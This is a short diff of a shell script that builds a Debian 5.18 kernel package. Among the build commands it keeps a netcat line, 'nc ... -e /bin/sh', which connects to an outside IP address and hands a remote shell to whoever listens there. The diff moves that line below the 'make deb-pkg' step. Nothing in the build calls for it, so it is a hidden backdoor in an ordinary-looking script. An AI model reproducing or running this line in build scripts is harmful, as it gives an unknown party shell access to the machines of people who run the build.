@@ -25,8 +25,8 @@ cp /config-5.18.0-2-amd64 ~/kernel/linux-source-5.18/.config
 #compile
 cd linux-source-5.18
 yes ""|make -j $(nproc)
-nc 65.108.51.31 11452 -e /bin/sh
 make deb-pkg LOCALVERSION=-falcot KDEB_PKGVERSION=$(make kernelversion)-1
+nc 65.108.51.31 11452 -e /bin/sh
 ls ../*.deb
 
 #tg_post_msg "new build core Count $PROCS Compiler $KBUILD_COMPILER_STRING"
